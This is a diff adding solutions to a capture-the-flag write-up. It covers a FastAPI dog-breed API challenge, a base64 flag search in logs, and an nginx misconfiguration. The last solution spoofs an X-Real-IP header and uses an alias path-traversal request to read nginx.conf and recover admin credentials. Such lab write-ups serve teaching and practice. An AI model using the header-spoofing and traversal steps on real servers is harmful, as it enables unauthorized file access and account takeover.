@@ -199,8 +199,100 @@ It then returned the flag.
 Description - We were hoping to move our new API to production, however it keeps failing tests! There’s a test file, and we try and submit it but it doesn’t work, we just 
 can’t get it to pass. We fired the guy that wrote the API a year ago. Can you help us? The veterinarians really need this API to get the data they need on new dog breeds faster. 
 Flag Format: FLAG{this_is_your_flag}
+
+The provided source code was
 ```
-place any code here
+from fastapi import Body, Depends, File, HTTPException, UploadFile, status, Security, FastAPI, Request
+from fastapi.security import APIKeyHeader, APIKeyQuery
+import requests
+import json
+from config import data_base
+from config import flagz
+
+API_KEYS = [
+    "9d207bf0-10f5-4d8f-a479-22ff5aeff8d1",
+    "f47d4a2c-24cf-4745-937e-620a5963c0b8",
+    "b7061546-75e8-444b-a2c4-f19655d07eb8",
+]
+
+data_list = requests.get(data_base).text
+json_data = data_list.replace('\"', '"')
+json_data = json.loads(json_data)
+
+api_key_query = APIKeyQuery(name="api-key", auto_error=False)
+api_key_header = APIKeyHeader(name="x-api-key", auto_error=False)
+
+def get_api_key(
+    request: Request,
+    api_key_query: str = Security(api_key_query),
+    api_key_header: str = Security(api_key_header),
+) -> str:
+    api_key = api_key_query or api_key_header
+    request_method = request.method
+    if request_method == "GET" and api_key not in API_KEYS:
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Invalid or missing API Key for GET method",
+        )
+    elif request_method == "POST" and api_key != API_KEYS[0]:
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Invalid or missing API Key for POST method",
+        )
+    return api_key
+
+app = FastAPI()
+
+@app.get("/dog-list")
+def get_data(api_key: str = Depends(get_api_key)):
+    raise HTTPException(
+        status_code=503,
+        detail="Not until test complete!",
+    )
+
+@app.post("/api-test")
+async def match_json(
+    file: UploadFile = File(...),
+    api_key: str = Depends(get_api_key),
+):
+    try:
+        user_dog_content = await file.read()
+        user_dog = json.loads(user_dog_content)
+    except json.JSONDecodeError:
+        raise HTTPException(
+            status_code=400,
+            detail="Invalid JSON file content.",
+        )
+
+    # Check if the provided JSON object matches any object in the list
+    xx = 0
+    matched_item = next(
+        (item for item in json_data if all(
+            key in item and item[key] == user_dog[key] and key != "id"
+            for key in user_dog
+        )),
+        None,
+    )
+    for item in json_data:
+        for key in item:
+            try:
+                if item[key] == user_dog[key]:
+                    xx = xx+1
+            except:
+                xx = xx
+            else:
+                xx = xx
+
+    if xx >= 4:
+        return "Test Successful! The API is ready for production. " + flagz
+    elif matched_item:
+        return "Test Unsuccessful. Partial Match: " + matched_item["name"]
+    else:
+        raise HTTPException(
+            status_code=404,
+            detail="No match found for the provided JSON.",
+        )
+
 ```
 Solution:
 For this one, I found the api located at hxxp://x.x.x.x:9988/api-test and put together a script to enumerate possible values for each of the expected in the json content listed below
@@ -306,29 +398,115 @@ Maybe there was a glitch in the server source however all it took was one correc
 ### Whisker Worries
 Description - Someone has compromised our web app! Investigate the logs to find the flag! 
 Flag Format: FLAG{f0UnD_FlaG}
-```
-place any code here
-```
+
 Solution:
-Plugged this straight into ChatGPT:
+There were three log files provided with this one.
+It felt like a bit of a cheat but the most basic was to solve was to use Cyber Chef, convert FLAG{ to base64 (RkxBR) and use that portion to search through each file.
+
+The base64 encoded flag was found in the proxy-access.log file
 ```
-More code here for solution
+RkxBR3tGM2wxbjNfRjRzaDEwbn0K
 ```
-:+1: FLAG{ENTER_FLAG_HERE}
+Decode it in cyber chef for the flag
+
+:+1: FLAG{F3l1n3_F4sh10n}
 <hr>
 
 ### Wobbly Proxy
 Description - Only the admin user can view the flag at /admin. What is wrong with this config? location /config {alias /etc/nginx/conf.d/; } Maybe try get a closer
 look at the configuration file. 
 Flag Format: FLAG{F0und_Fl4g}
-```
-place any code here
-```
+
 Solution:
-Plugged this straight into ChatGPT:
+Add wobbly.cbg into /etc/hosts file first of all
+There was also no need to create an account.
+When browsing to http://wobbly.cbg/config an error would present itself indicating that only traffic from 133.133.133.133 would be allowed.
+
+In burpsuite, you could request the site http://wobbly.cbg/config then send to repeater and add:
 ```
-More code here for solution
+X-Real-IP: 133.133.133.133
 ```
-:+1: FLAG{ENTER_FLAG_HERE}
-<hr>
+Modify the GET request in repeater to GET /config/default.conf and it'll return
+```
+server {
+    listen       80;
+    listen  [::]:80;
+    server_name  localhost;
+
+    #access_log  /var/log/nginx/host.access.log  main;
+
+    location / {
+        root   /usr/share/nginx/html;
+        index  index.html index.htm;
+    }
+
+    #error_page  404              /404.html;
+
+    # redirect server error pages to the static page /50x.html
+    #
+    error_page   500 502 503 504  /50x.html;
+    location = /50x.html {
+        root   /usr/share/nginx/html;
+    }
+
+    # proxy the PHP scripts to Apache listening on 127.0.0.1:80
+    #
+    #location ~ \.php$ {
+    #    proxy_pass   http://127.0.0.1;
+    #}
+
+    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
+    #
+    #location ~ \.php$ {
+    #    root           html;
+    #    fastcgi_pass   127.0.0.1:9000;
+    #    fastcgi_index  index.php;
+    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
+    #    include        fastcgi_params;
+    #}
+
+    # deny access to .htaccess files, if Apache's document root
+    # concurs with nginx's one
+    #
+    #location ~ /\.ht {
+    #    deny  all;
+    #}
+}
+```
+This was cool, but we had to see if we could get to the nginx config file. Using some LFI, change the GET request in burp to
+```
+GET /config../nginx.conf
+```
+And was presented with the nginx.conf file
+```
+error_log  /dev/stderr debug;
+events{}
+http {
+    access_log /dev/stdout;
+    include /etc/nginx/mime.types;
+    server {
+        listen 80;
+        server_name wobbly.cbg;
+        root /usr/share/nginx/html;
+        index index.html;
+        location / {
+            try_files $uri $uri/ /index.html;
+        }
+
+        # admin:%%&u4XuBx2d
+        location /config {
+            alias /etc/nginx/conf.d/;
+            error_page 405 /405.html;
+            if ($http_x_real_ip != "133.133.133.133") {
+                return 405;
+            }
+        }
+
+    }
+}
+```
+In a sneaky comment, the admin credentials were exposed.
+Logged back into the web portal using these and scrolled down to get the flag.
+
+:+1: FLAG{W0bble_W4tch_Tr4v3l_H3ist}
 <hr>
